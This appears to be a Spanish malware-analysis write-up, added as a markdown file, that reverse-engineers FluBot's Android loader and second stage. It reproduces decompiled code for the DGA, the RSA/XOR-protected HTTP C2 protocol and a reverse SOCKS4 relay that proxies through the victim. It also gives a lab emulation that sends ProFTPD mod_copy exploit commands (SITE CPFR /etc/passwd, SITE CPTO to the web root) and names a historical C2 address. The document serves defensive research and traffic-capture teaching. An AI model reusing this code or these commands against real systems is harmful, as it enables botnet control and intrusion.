@@ -1,0 +1,559 @@
+FluBot incorpora una segunda etapa de código en el recurso `assets/fBbBL.json`. El uso de HTTP, dominios generados algorítmicamente y cuerpos protegidos mediante RSA se encuentra contextualizado en el [análisis de FluBot publicado por Proofpoint](https://www.proofpoint.com/us/blog/threat-insight/flubot-android-malware-spreading-rapidly-through-europe-may-hit-us-soon). Aunque la extensión sugiere un documento JSON, el cargador copia el recurso al almacenamiento privado de la aplicación, lo descifra y lo utiliza como un DEX. Esta preparación es local: el código ya forma parte de la APK y no se descarga durante la ejecución.
+
+La etapa recuperada genera dominios mediante un DGA, selecciona un panel accesible por HTTP y recibe órdenes dentro de respuestas cuyo cuerpo está protegido mediante RSA y un cifrado XOR propio. Una de esas órdenes activa un relé SOCKS4 inverso. El teléfono abre tanto el canal de control como los subcanales hacia el C2, interpreta en ellos solicitudes `CONNECT` y crea una tercera conexión hacia el destino indicado por el operador.
+
+El análisis estático se apoya en la APK contenedora y en el DEX reconstruido a partir del recurso cifrado:
+
+| Artefacto estudiado | Función | SHA-256 |
+|---|---|---|
+| APK contenedora | Muestra con el cargador y `assets/fBbBL.json` | `30937927e8891f8c0fd2c7b6be5fbc5a05011c34a7375e91aad384b82b9e6a67` |
+| `fBbBL.dex` | Etapa reconstruida que implementa el DGA, el panel HTTP y el relé SOCKS4 | `27ed9910cd1e4f2357df3d687bb8a375b97c1a8655cf0c30a64eff495a9b3b1c` |
+
+Para la captura se conserva un flujo que permite observar [T1604, Proxy Through Victim](https://attack.mitre.org/techniques/T1604/): el C2 ordena al dispositivo crear el relé y utiliza después ese dispositivo para alcanzar un servicio FTP. Los puertos de control y datos del relé son configurables y no están limitados al puerto registrado para SOCKS, lo que permite representar [T1509, Non-Standard Port](https://attack.mitre.org/techniques/T1509/). Sobre el túnel se reproduce de forma inocua una conversación asociada con [T1428, Exploitation of Remote Services](https://attack.mitre.org/techniques/T1428/). Esta última técnica pertenece al escenario controlado: el código de FluBot proporciona el relé, pero no contiene por sí mismo la carga dirigida contra FTP.
+
+### Análisis estático de `DexLoader`
+
+La carga comienza en la clase `sort.furnace.option.NOyFcUaIeCgFiIcLzDl`, declarada como `Application` en el manifiesto. El método `attachBaseContext(Context)` obtiene primero el directorio privado donde preparará la etapa:
+
+```java
+String strPeasanttimber = peasanttimber(
+    coverhappy(this.GDxBcPhWtGiWyBzTbDiNbImTpEkUkMlYdFeIaKcJhJjGgFrLqShHh)
+);
+```
+
+El método `coverhappy()` contiene numerosas operaciones de relleno, pero su resultado depende únicamente de la llamada a `Context.getDir()`:
+
+```java
+public File coverhappy(Context context) {
+    // Operaciones de relleno sin efecto sobre el valor devuelto.
+    return context.getDir(this.UDuDwRoYtTiLpNhDtTlZuWjPsLhCr, 0);
+}
+```
+
+El nombre almacenado en el atributo se construye mediante `birthrobot()` y `signtail()`. La segunda rutina aplica XOR con `0x26` a trece bytes y obtiene la cadena `DynamicOptDex`. Android transforma ese nombre en el directorio privado `app_DynamicOptDex`.
+
+El método `peasanttimber()` se limita a recuperar su ruta absoluta:
+
+```java
+public String peasanttimber(File file) {
+    return file.getAbsolutePath();
+}
+```
+
+La siguiente cadena de envoltorios añade el nombre `fBbBL.json` a esa ruta:
+
+```java
+String strFiretrial = firetrial(strPeasanttimber);
+
+public String firetrial(String str) {
+    return attendmerry(str);
+}
+
+public String attendmerry(String str) {
+    return elementaddict(str).getAbsolutePath();
+}
+
+public File elementaddict(String str) {
+    return new File(
+        str,
+        this.ZUmOsEwHdJcYoRlHwDrTjJgOzUqMeMdAnUyTcXhCrGdKaKzCkTuGgSq
+    );
+}
+```
+
+El fichero de destino no debe confundirse con el recurso original. La APK contiene `assets/fBbBL.json`; el cargador crea otro fichero con el mismo nombre dentro de `app_DynamicOptDex`, copia allí el recurso y sustituye su contenido por el resultado del descifrado:
+
+```java
+boolean zTwiceworth = twiceworth(strFiretrial);
+
+public boolean twiceworth(String str) {
+    return new QAtSqIoGfQyGkIiGnTjJwBbZmGzYxUrFnUsHfDwEcKtXxXr()
+        .upsetbeef(
+            str,
+            this.GDxBcPhWtGiWyBzTbDiNbImTpEkUkMlYdFeIaKcJhJjGgFrLqShHh,
+            this.ZUmOsEwHdJcYoRlHwDrTjJgOzUqMeMdAnUyTcXhCrGdKaKzCkTuGgSq
+        );
+}
+```
+
+La cadena relevante atraviesa los métodos `upsetbeef()`, `indicateblame()`, `ignorenotable()`, `noteinfant()`, `westhumor()` y `quarterdisplay()`. El método `indicateblame()` abre el recurso, lo copia al directorio privado, lee sus bytes, aplica la transformación implementada por las rutinas restantes y escribe el resultado sobre el fichero de destino. Las funciones `westhumor()` y `quarterdisplay()` contienen la operación RC4 utilizada en esta fase.
+
+Después de ejecutar la muestra, el directorio privado contiene el recurso procesado y el DEX preparado por Android:
+
+```powershell
+PS: adb shell
+```
+
+```text
+generic_x86:/ # cd /data/data/com.tencent.mm/app_DynamicOptDex
+generic_x86:/data/data/com.tencent.mm/app_DynamicOptDex # ls
+fBbBL.dex fBbBL.json
+```
+
+El artefacto procesado puede recuperarse para su análisis sin atribuir esta operación al tráfico de la muestra:
+
+```powershell
+PS: adb pull /data/data/com.tencent.mm/app_DynamicOptDex/fBbBL.json .
+```
+
+### Análisis del fichero `fBbBL.json`
+
+La cabecera del contenido descifrado demuestra que no se trata de JSON, sino de un DEX versión 037:
+
+```text
+64 65 78 0a 30 33 37 00
+d  e  x  \n 0  3  7  \0
+```
+
+El código de interés se encuentra en `com.example.myapplicationtest`. La clase `Bot` inicia el comportamiento principal mediante `Main(Context)`. El método conserva el contexto, instala un manejador global de excepciones, deshabilita el componente `MainActivity`, carga los textos, obtiene el identificador de víctima y crea un hilo para el flujo de red:
+
+```java
+public static void Main(Context context2) {
+    if (context != null) {
+        return;
+    }
+
+    context = context2;
+    Thread.setDefaultUncaughtExceptionHandler(new MyExceptionHandler());
+    context.getPackageManager().setComponentEnabledSetting(
+        new ComponentName(context, (Class<?>) MainActivity.class),
+        2,
+        1
+    );
+    LangTxt.Main(context);
+    BotId.GetBotId(context);
+    new Thread(new AnonymousClass1()).start();
+}
+```
+
+La clase `BotId` recupera el identificador de `SharedPreferences`. Si todavía no existe, genera un UUID, lo convierte a mayúsculas, elimina los guiones y lo persiste. El resultado habitual ocupa 32 caracteres ASCII:
+
+```java
+if (string == null) {
+    botId = UUID.randomUUID()
+        .toString()
+        .toUpperCase()
+        .replaceAll("-", "");
+
+    SharedPreferences.Editor editorEdit = sharedPreferences.edit();
+    editorEdit.putString(preferenceKey, botId);
+    editorEdit.commit();
+}
+```
+
+El identificador se reutiliza tanto en el cuerpo de las peticiones HTTP como en el saludo binario del relé SOCKS.
+
+El hilo creado por `Bot.Main()` no continúa hasta que el DGA encuentra un dominio válido. Si no lo consigue, espera 70 segundos antes de volver a consultar el valor:
+
+```java
+while (DGA.GetHost() == null) {
+    Utils.Sleep(70);
+}
+
+Bot.GetInjectsServer();
+Spammer.Main(Bot.context);
+Bot.WakeHack();
+Bot.ProcessCommands();
+```
+
+El método `GetInjectsServer()` crea otro hilo. Por ello, la recuperación de inyecciones y el bucle `ProcessCommands()` pueden generar peticiones concurrentes una vez seleccionado el panel; el código no establece que `GET_INJECTS_LIST` deba preceder siempre a `PING`.
+
+El primer paso del flujo de red consiste en seleccionar el panel. Para ello, la clase `DGA` calcula una semilla a partir del año y del mes local de Android. La constante final `1136` forma parte del algoritmo:
+
+```java
+private static void GetSeed() {
+    int year = Calendar.getInstance().get(Calendar.YEAR);
+    int month = Calendar.getInstance().get(Calendar.MONTH);
+
+    long value = year ^ month;
+    value *= 2;
+    value *= year ^ value;
+    value *= month ^ value;
+    value *= value;
+    seed = value + 1136;
+}
+```
+
+El mes usa la numeración de `Calendar.MONTH`, cuyo intervalo comienza en cero. Como la semilla cambia con esos dos valores, la secuencia de candidatos también cambia mensualmente.
+
+El método `FindHost()` genera hasta 2.000 nombres y distribuye su comprobación en un grupo de 50 hilos. Cada etiqueta contiene quince caracteres elegidos entre `a` e `y`:
+
+```java
+GetSeed();
+ThreadPoolExecutor executor =
+    (ThreadPoolExecutor) Executors.newFixedThreadPool(50);
+
+Random random = new Random(seed);
+
+for (int i = 0; i < MAX_HOSTS; i++) {
+    String name = "";
+    for (int j = 0; j < 15; j++) {
+        name = name + ((char) (random.nextInt(25) + 97));
+    }
+
+    if (i % 3 == 0) {
+        candidate = name + ".ru";
+    } else if (i % 2 == 0) {
+        candidate = name + ".com";
+    } else {
+        candidate = name + ".cn";
+    }
+
+    executor.submit(
+        new $$Lambda$DGA$s_X69aJ2fAhaPbmAo_ec0lS5TOo(
+            selected,
+            candidate,
+            found
+        )
+    );
+}
+```
+
+El método de validación aplica dos pruebas. `Utils.IsReachable()` llama realmente a `InetAddress.getByName()`, por lo que solo comprueba que el nombre pueda resolverse. Si existe una respuesta DNS, `PanelReq.Send()` envía el mensaje `PREPING,` al dominio candidato. El primer candidato que supera ambas condiciones se conserva como C2:
+
+```java
+static void validate(
+        AtomicReference selected,
+        String candidate,
+        AtomicBoolean found) {
+
+    if (Thread.currentThread().isInterrupted()
+            || selected.get() != null
+            || !Utils.IsReachable(candidate)
+            || PanelReq.Send(candidate, "PREPING,") == null) {
+        return;
+    }
+
+    selected.set(candidate);
+    found.set(true);
+}
+```
+
+Esto produce consultas DNS concurrentes y, únicamente para los nombres que resuelvan, peticiones HTTP de validación. Una resolución positiva no basta: la respuesta del panel debe superar también la autenticación y el descifrado de `PanelReq.Send()`.
+
+Todas las comunicaciones con el panel, incluida la validación mediante `PREPING,`, pasan por la clase `PanelReq`. Esta fija TCP/80 y la ruta `/poll.php`. El transporte no utiliza TLS; la aplicación protege el cuerpo mediante una clave efímera de diez letras, RSA y una transformación XOR propia:
+
+```java
+HttpCom httpCom = new HttpCom();
+httpCom.SetPort(80);
+httpCom.SetHost(host);
+httpCom.SetPath("/poll.php");
+
+String sessionKey = "";
+SecureRandom random = new SecureRandom();
+for (int i = 0; i < 10; i++) {
+    sessionKey = sessionKey + ((char) (random.nextInt(25) + 97));
+}
+
+String identity = BotId.GetBotId(null) + "," + sessionKey;
+String encryptedIdentity = EncryptRSA(identity);
+
+byte[] payload = input.getBytes(StandardCharsets.UTF_8);
+Encrypt(payload, sessionKey.getBytes(StandardCharsets.US_ASCII), true);
+
+httpCom.SetPostContent(String.format(
+    "%s\r\n%s",
+    encryptedIdentity,
+    Base64.encodeToString(payload, Base64.NO_WRAP)
+));
+httpCom.SetPost(true);
+```
+
+La primera línea contiene en Base64 el `BotId` y la clave de sesión cifrados con la clave pública RSA integrada. La segunda contiene el mensaje de aplicación transformado mediante XOR y codificado en Base64. La forma observable de la petición es:
+
+```http
+POST /poll.php HTTP/1.1
+Host: <dominio_seleccionado>
+Content-Length: <longitud>
+
+<base64_rsa(BotId,clave_sesion)>
+<base64_xor(mensaje,clave_sesion)>
+```
+
+El cuerpo de respuesta contiene un único valor Base64. Tras decodificarlo y revertir el XOR, la aplicación exige que la primera línea coincida con el mismo `BotId` y la misma clave efímera. Solo entonces devuelve el texto situado después de `CRLF`:
+
+```java
+byte[] decoded = Base64.decode(httpCom.GetOutputString(), Base64.DEFAULT);
+Encrypt(decoded, sessionKeyBytes, false);
+
+String[] parts = new String(decoded, StandardCharsets.UTF_8)
+    .split("\r\n", 2);
+
+if (parts.length == 2 && parts[0].equals(identity)) {
+    return parts[1];
+}
+return null;
+```
+
+Por tanto, una respuesta válida tiene esta representación lógica antes de aplicar XOR y Base64:
+
+```text
+<BotId>,<clave_sesion>
+<orden_o_respuesta>
+```
+
+La clave cambia en cada petición. Sin la clave privada del panel original no es posible recuperar desde el primer campo la clave efímera que permitiría generar respuestas válidas para la muestra. El laboratorio conserva el protocolo, pero utiliza un par RSA controlado y un cliente Python emulado. El siguiente esquema original resume esa separación entre RSA y XOR:
+
+![[Pasted image 20260620192438.png]]
+
+Una vez que el DGA ha seleccionado un panel válido, el hilo de inyecciones enumera los paquetes instalados y envía el mensaje `GET_INJECTS_LIST,` seguido de la lista separada por comas:
+
+```java
+List<ApplicationInfo> applications =
+    context.getPackageManager().getInstalledApplications(128);
+
+String packages = "";
+for (int i = 0; i < applications.size(); i++) {
+    packages = packages + applications.get(i).packageName;
+    if (i != applications.size() - 1) {
+        packages = packages + ",";
+    }
+}
+
+String response = PanelReq.Send("GET_INJECTS_LIST," + packages);
+```
+
+En paralelo, `ProcessCommands()` envía periódicamente `PING` con la versión del malware, la versión de Android, el fabricante, el modelo, el idioma, el tiempo de actividad y el operador de red:
+
+```java
+String response = PanelReq.Send(String.format(
+    "%s,%s,%s,%s,%s,%s,%d,%s",
+    "PING",
+    "3.1",
+    Build.VERSION.RELEASE,
+    Build.MANUFACTURER,
+    Build.MODEL,
+    language,
+    Integer.valueOf(uptimeSeconds),
+    networkOperatorName
+));
+```
+
+Una respuesta funcional se divide por la primera coma. La primera parte identifica la orden y la segunda contiene sus argumentos:
+
+```java
+String[] command = response.split(",", 2);
+if (command.length == 2) {
+    HandleCommand(command[0], command[1]);
+}
+```
+
+El despachador solo procesa las órdenes cuando `Utils.HasPermissions(context, ProgConfig.PERMISSIONS)` devuelve un resultado positivo. Entre las ramas disponibles se encuentra `SOCKS`; el valor se divide por el primer carácter `:` y se interpreta como host y puerto:
+
+```java
+String[] endpoint = arguments.split(":", 2);
+if (endpoint.length != 2) {
+    return;
+}
+
+new Thread(new AnonymousClass2(endpoint)).start();
+```
+
+La orden que activa el relé adopta esta forma:
+
+```text
+SOCKS,<host_c2>:<puerto_control>
+```
+
+Al procesar la orden, el constructor de `SocksClient` abre una conexión TCP saliente al extremo indicado, activa `SO_KEEPALIVE` y conserva el host para los subcanales posteriores:
+
+```java
+SocksClient(String host, int port) {
+    try {
+        Socket socket = new Socket(host, port);
+        this.socket = socket;
+        socket.setKeepAlive(true);
+        this.host = host;
+        Connect();
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+```
+
+Al establecer el canal de control, la víctima envía tres campos en orden: la constante `181030` como entero de cuatro bytes, la longitud del `BotId` como otro entero de cuatro bytes y el propio identificador en UTF-8. `ByteBuffer` utiliza orden de red de forma predeterminada, por lo que ambos enteros se serializan en *big-endian*:
+
+```java
+outputStream.write(Int2bytes(181030));
+String botId = BotId.GetBotId();
+outputStream.write(Int2bytes(botId.length()));
+outputStream.write(String2bytes(botId));
+```
+
+Para un identificador de 32 caracteres, el saludo comienza así:
+
+```text
+Víctima a C2
+
+00 02 C3 26                  # 181030
+00 00 00 20                  # longitud del BotId
+<32 bytes ASCII del BotId>
+```
+
+Después del saludo, el C2 envía números de puerto de dos bytes por el mismo canal. Cada valor positivo hace que la víctima cree un hilo y abra una nueva conexión TCP hacia el mismo host del C2, pero al puerto recibido:
+
+```java
+while (true) {
+    byte[] portBytes = new byte[2];
+    if (inputStream.read(portBytes) == -1) {
+        return;
+    }
+
+    int dataPort = Bytes2short(portBytes) & 0xffff;
+    if (dataPort > 0) {
+        new Thread(new AnonymousClass1(dataPort)).start();
+    }
+}
+```
+
+Por ejemplo, el puerto 9001 se representa en *big-endian* mediante dos bytes:
+
+```text
+C2 a víctima
+
+23 29                         # puerto 9001
+```
+
+El método `Proxy(int)` no escucha conexiones entrantes en Android. Abre otro socket saliente al C2 y espera que el operador escriba en él una solicitud SOCKS4:
+
+```java
+Socket c2DataSocket = new Socket();
+c2DataSocket.connect(new InetSocketAddress(this.host, dataPort));
+c2DataSocket.setTcpNoDelay(true);
+c2DataSocket.setSoLinger(false, 0);
+
+InputStream inputStream = c2DataSocket.getInputStream();
+OutputStream outputStream = c2DataSocket.getOutputStream();
+```
+
+La implementación admite únicamente la versión `0x04` y la operación `0x01`, correspondiente a `CONNECT`. Cualquier otro valor provoca el código de rechazo `0x5b` y el cierre del subcanal:
+
+```java
+if (inputStream.read() != 4) {
+    outputStream.write(91);
+    c2DataSocket.close();
+    return;
+}
+
+if (inputStream.read() != 1) {
+    outputStream.write(91);
+    c2DataSocket.close();
+    return;
+}
+```
+
+Después lee el puerto de destino, la dirección IPv4 y un `USERID` terminado en cero. La petición completa tiene la estructura definida por SOCKS4:
+
+```text
+C2 a víctima
+
+04 01 <PUERTO_DESTINO_BE> <IPV4_DESTINO> <USERID_ASCII> 00
+```
+
+Una vez consumido el terminador, la víctima abre una tercera conexión TCP hacia el destino solicitado:
+
+```java
+Socket targetSocket = new Socket();
+targetSocket.connect(new InetSocketAddress(destinationIp, destinationPort));
+
+InputStream targetInput = targetSocket.getInputStream();
+OutputStream targetOutput = targetSocket.getOutputStream();
+```
+
+Si la conexión tiene éxito, la víctima devuelve la respuesta SOCKS4 positiva. Los seis bytes finales se rellenan con cero en vez de repetir el puerto y la dirección enlazados:
+
+```java
+outputStream.write(0);
+outputStream.write(90);
+outputStream.write(new byte[6]);
+outputStream.flush();
+```
+
+```text
+Víctima a C2
+
+00 5A 00 00 00 00 00 00
+```
+
+Finalmente, dos hilos copian bloques de hasta 512 bytes en ambos sentidos entre el subcanal del C2 y el socket del destino. A partir de ese momento, los mensajes FTP enviados por el operador atraviesan el teléfono, llegan al servidor objetivo y sus respuestas regresan por el mismo relé.
+
+El siguiente esquema conserva la representación original de los tres flujos TCP implicados:
+
+![[Pasted image 20260620180901.png]]
+
+Para el laboratorio se utiliza como ejemplo un servicio que reproduce de forma inocua el comportamiento asociado con [CVE-2015-3306](https://nvd.nist.gov/vuln/detail/CVE-2015-3306). La vulnerabilidad afecta al módulo `mod_copy` de ProFTPD 1.3.5 y permite operar sobre rutas arbitrarias mediante `SITE CPFR` y `SITE CPTO`. La primera orden selecciona el origen y la segunda solicita su copia a otro destino. El escenario usa `/etc/passwd` como ruta de origen y una ruta bajo `/var/www/html/` como destino, pero el servidor Python no accede al sistema de archivos ni ejecuta la explotación: solo devuelve respuestas FTP plausibles. La [RFC 959](https://www.rfc-editor.org/rfc/rfc959) define `SITE` como el mecanismo para servicios específicos del sistema; `CPFR` y `CPTO` son extensiones de ProFTPD.
+
+### Secuencia comunicativa
+
+El diagrama muestra la rama seleccionada. Tras la resolución y validación del dominio, la recuperación de inyecciones y el sondeo `PING` pueden ejecutarse en paralelo. La orden `SOCKS` habilita después un canal de control, un subcanal hacia el C2 y la conexión final que convierte a la víctima en relé.
+
+```mermaid
+sequenceDiagram
+    participant V as Víctima Android
+    participant DNS as Resolutor DNS
+    participant H as Panel HTTP
+    participant C as C2 SOCKS
+    participant F as Servidor FTP controlado
+
+    Note over V: Descifrado y carga local de fBbBL.json sin tráfico de red
+    Note over V: Generación o recuperación del BotId
+
+    loop Hasta encontrar un dominio válido entre los candidatos del DGA
+        V->>DNS: Consulta A del dominio candidato
+        DNS-->>V: Respuesta positiva o error
+        opt El dominio resuelve
+            V->>H: TCP/80 y POST /poll.php con PREPING cifrado
+            H-->>V: Respuesta HTTP autenticada con la clave efímera
+        end
+    end
+
+    par Recuperación de inyecciones
+        V->>H: POST /poll.php con GET_INJECTS_LIST y paquetes instalados
+        H-->>V: Lista cifrada de inyecciones
+    and Bucle de órdenes
+        V->>H: POST /poll.php con PING y datos del dispositivo
+        H-->>V: Respuesta cifrada SOCKS con host y puerto de control
+    end
+
+    Note over V: HandleCommand exige los permisos configurados
+    V->>C: TCP al puerto de control
+    V->>C: magic 181030, longitud y BotId
+    C-->>V: Puerto del subcanal en 2 bytes big-endian
+    V->>C: Nueva TCP al puerto de datos indicado
+    C-->>V: SOCKS4 CONNECT con destino IPv4 y puerto FTP
+    V->>F: Nueva TCP hacia el destino solicitado
+    F-->>V: Banner FTP
+    V-->>C: Respuesta SOCKS4 00 5A y banner retransmitido
+
+    C->>V: USER y PASS
+    V->>F: USER y PASS
+    F-->>V: Respuestas FTP
+    V-->>C: Respuestas FTP retransmitidas
+
+    C->>V: SITE CPFR /etc/passwd
+    V->>F: SITE CPFR /etc/passwd
+    F-->>V: 350 Ready for destination name
+    V-->>C: 350 retransmitido
+
+    C->>V: SITE CPTO /var/www/html/pwned.txt
+    V->>F: SITE CPTO /var/www/html/pwned.txt
+    F-->>V: 250 Copy successful
+    V-->>C: 250 retransmitido
+```
+
+### Laboratorio de generación del PCAP
+
+El laboratorio emula íntegramente el comportamiento de red mediante Python; no ejecuta la APK. `bot_emulator.py` reproduce el DGA ya reducido a un dominio controlado, el cuerpo HTTP protegido mediante RSA y XOR, el saludo binario y el relé SOCKS4. `c2_server.py` actúa como panel HTTP y controlador del relé, mientras que `ftp_vulnerable.py` ofrece un servicio FTP aislado que reconoce `SITE CPFR` y `SITE CPTO` sin leer, escribir ni ejecutar contenido real.
+
+| Entidad | Dirección y servicio | Procedencia |
+|---|---|---|
+| Víctima emulada | `10.106.7.10` | Dirección privada asignada al cliente dentro de la topología aislada. |
+| Resolutor DNS | `8.8.8.8:53` | Dirección publicada para Google Public DNS; el servicio se emula dentro del *namespace* aislado. |
+| C2 de FluBot | `189.165.94.67:80`, `:9000` y `:4444` | Spamhaus documentó `189.165.94.67` como una de las respuestas A del dominio FluBot `gurbngbcxheshsj.ru` dentro de su infraestructura *fast-flux*. TCP/80 conserva el panel observado; TCP/9000 y TCP/4444 son puertos controlados del relé emulado. |
+| Objetivo FTP | `10.106.7.20:21` | Host privado controlado dentro de la red de la víctima. Lo selecciona el operador del escenario y no se atribuye a FluBot. |
+
+El dominio `gurbngbcxheshsj.ru` se fija en el resolutor controlado y devuelve `189.165.94.67`, pareja publicada en el [informe de Spamhaus sobre redes de bots del tercer trimestre de 2021](https://www.spamhaus.com/custom-content/uploads/2021/10/2021-Quarter-3-Botnet-Threat-Update_Web-Final.pdf). El panel conserva TCP/80, el canal de control utiliza TCP/9000 y el subcanal SOCKS utiliza TCP/4444. La asignación de los dos últimos puertos a esa entidad pertenece al laboratorio y no afirma que Spamhaus los observara abiertos. El puerto FTP se fija en TCP/21 en esta ejecución. El par RSA pertenece al laboratorio porque la clave privada del panel histórico no está disponible. No se necesita una autoridad de certificación, ya que el protocolo usa HTTP sin TLS.
+
+Este escenario está automatizado en `python-labnet` con el identificador `flubot`. La ejecución, la captura y la recopilación de la clave RSA del laboratorio se describen en la [guía central de laboratorios Python](Laboratorios%20Python.md).
+
+La captura contiene la consulta DNS, las peticiones HTTP del panel, el canal de control, el subcanal SOCKS4, la conexión desde la víctima emulada al servicio FTP y los comandos `SITE` retransmitidos. Los efectos sobre rutas de archivos se limitan a respuestas simuladas por el servidor controlado.
